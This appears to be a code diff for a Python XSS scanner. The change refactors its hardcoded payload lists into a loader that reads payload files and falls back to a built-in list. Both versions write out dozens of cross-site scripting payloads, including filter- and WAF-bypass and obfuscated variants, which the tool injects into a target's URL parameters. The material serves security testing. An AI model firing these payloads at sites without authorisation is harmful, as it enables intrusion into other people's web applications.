@@ -7,6 +7,7 @@ Real-time payload testing with visual feedback
 
 import time
 import sys
+import os
 import urllib.parse
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
@@ -33,7 +34,7 @@ import queue
 import random
 
 class InteractiveXSSScanner:
-    def __init__(self):
+    def __init__(self, custom_payloads_file=None):
         self.console = Console()
         self.session = requests.Session()
         self.session.headers.update({
@@ -51,65 +52,92 @@ class InteractiveXSSScanner:
         self.driver = None
         self.setup_selenium()
         
-        # Payload collections
-        self.basic_payloads = [
-            '<script>alert("XSS")</script>',
-            '<img src=x onerror=alert("XSS")>',
-            '<svg onload=alert("XSS")>',
-            '"><script>alert("XSS")</script>',
-            '\'><script>alert("XSS")</script>',
-            '<iframe src="javascript:alert(\'XSS\')">',
-            '<body onload=alert("XSS")>',
-            '<marquee onstart=alert("XSS")>',
-            '<details open ontoggle=alert("XSS")>',
-            '<audio src=x onerror=alert("XSS")>',
+        # Load payloads from file or use defaults
+        self.payloads = self.load_payloads(custom_payloads_file)
+        
+    def load_payloads(self, custom_file=None):
+        """Load payloads from custom file or use defaults"""
+        payloads = []
+        
+        # Try to load from custom file first
+        if custom_file and os.path.exists(custom_file):
+            try:
+                with open(custom_file, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            payloads.append(line)
+                
+                self.console.print(f"[green]✓[/green] Loaded {len(payloads)} payloads from {custom_file}")
+                return payloads
+            except Exception as e:
+                self.console.print(f"[red]Error loading custom payloads: {e}[/red]")
+        
+        # Try default payload files
+        payload_files = [
+            'assets/payloads.txt',
+            'assets/advanced_payloads.txt',
+            'payloads.txt'
         ]
         
-        self.advanced_payloads = [
-            # Context breaking payloads
-            '\';alert("XSS");//',
-            '\";alert("XSS");//',
-            '</script><script>alert("XSS")</script>',
-            '</title><script>alert("XSS")</script>',
-            '</textarea><script>alert("XSS")</script>',
+        for payload_file in payload_files:
+            if os.path.exists(payload_file):
+                try:
+                    with open(payload_file, 'r', encoding='utf-8') as f:
+                        for line in f:
+                            line = line.strip()
+                            if line and not line.startswith('#'):
+                                payloads.append(line)
+                    
+                    if payloads:
+                        self.console.print(f"[green]✓[/green] Loaded {len(payloads)} payloads from {payload_file}")
+                        break
+                except Exception as e:
+                    continue
+        
+        # Fallback to hardcoded payloads if no file found
+        if not payloads:
+            payloads = [
+                '<script>alert("XSS")</script>',
+                '<img src=x onerror=alert("XSS")>',
+                '<svg onload=alert("XSS")>',
+                '"><script>alert("XSS")</script>',
+                '\'><script>alert("XSS")</script>',
+                '<iframe src="javascript:alert(\'XSS\')">',
+                '<body onload=alert("XSS")>',
+                '<marquee onstart=alert("XSS")>',
+                '<details open ontoggle=alert("XSS")>',
+                '<audio src=x onerror=alert("XSS")>',
+                '\';alert("XSS");//',
+                '\";alert("XSS");//',
+                '</script><script>alert("XSS")</script>',
+                '</title><script>alert("XSS")</script>',
+                '</textarea><script>alert("XSS")</script>',
+                'onmouseover=alert("XSS")',
+                'onfocus=alert("XSS") autofocus',
+                'onanimationstart=alert("XSS")',
+                'ontransitionend=alert("XSS")',
+                '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
+                '<svg><set onbegin=alert("XSS") attributeName=x to=y>',
+                '<video><source onerror="alert(\'XSS\')">',
+                '<audio controls><source onerror="alert(\'XSS\')">',
+                '<ScRiPt>alert("XSS")</ScRiPt>',
+                '<sCrIpT>alert("XSS")</ScRiPt>',
+                '<script>alert(String.fromCharCode(88,83,83))</script>',
+                '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
+                '&lt;script&gt;alert("XSS")&lt;/script&gt;',
+                '<script>alert("XSS");</script>',
+                '<script>/**/alert("XSS");</script>',
+                '<script>window["alert"]("XSS")</script>',
+                '<script>top["alert"]("XSS")</script>',
+                'javascript:alert("XSS")',
+                'data:text/html,<script>alert("XSS")</script>',
+                '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
+                '<script>Function("alert(\'XSS\')")();</script>',
+            ]
+            self.console.print(f"[yellow]⚠[/yellow] Using {len(payloads)} default payloads")
             
-            # Event handler payloads
-            'onmouseover=alert("XSS")',
-            'onfocus=alert("XSS") autofocus',
-            'onanimationstart=alert("XSS")',
-            'ontransitionend=alert("XSS")',
-            
-            # SVG payloads
-            '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
-            '<svg><set onbegin=alert("XSS") attributeName=x to=y>',
-            
-            # HTML5 payloads
-            '<video><source onerror="alert(\'XSS\')">',
-            '<audio controls><source onerror="alert(\'XSS\')">',
-            
-            # Filter bypass
-            '<ScRiPt>alert("XSS")</ScRiPt>',
-            '<sCrIpT>alert("XSS")</ScRiPt>',
-            '<script>alert(String.fromCharCode(88,83,83))</script>',
-            
-            # Encoded payloads
-            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
-            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
-            
-            # WAF bypass
-            '<script>alert("XSS");</script>',
-            '<script>/**/alert("XSS");</script>',
-            '<script>window["alert"]("XSS")</script>',
-            '<script>top["alert"]("XSS")</script>',
-            
-            # DOM XSS
-            'javascript:alert("XSS")',
-            'data:text/html,<script>alert("XSS")</script>',
-            
-            # Advanced obfuscation
-            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
-            '<script>Function("alert(\'XSS\')")();</script>',
-        ]
+        return payloads
 
     def setup_selenium(self):
         """Initialize Selenium WebDriver"""
@@ -261,9 +289,8 @@ class InteractiveXSSScanner:
         
         self.console.print(f"[cyan]📋 Found {len(parameters)} parameters: {', '.join(parameters)}[/cyan]")
         
-        # Prepare all payloads
-        all_payloads = self.basic_payloads + self.advanced_payloads
-        self.total_payloads = len(all_payloads) * len(parameters)
+        # Use loaded payloads
+        self.total_payloads = len(self.payloads) * len(parameters)
         
         self.console.print(f"[yellow]🎯 Total tests to run: {self.total_payloads}[/yellow]\n")
         
@@ -277,7 +304,7 @@ class InteractiveXSSScanner:
             self.console.print(f"\n[bold cyan]📍 Testing parameter: {param}[/bold cyan]")
             self.console.print("─" * 60)
             
-            for payload in all_payloads:
+            for payload in self.payloads:
                 payload_counter += 1
                 self.tested_payloads += 1
                 
